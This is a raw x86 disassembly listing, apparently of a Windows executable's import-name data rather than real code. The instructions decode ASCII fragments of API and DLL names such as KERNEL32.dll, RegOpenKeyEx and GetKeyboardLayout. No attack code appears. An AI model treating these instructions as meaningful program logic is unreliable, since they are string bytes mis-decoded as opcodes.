  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
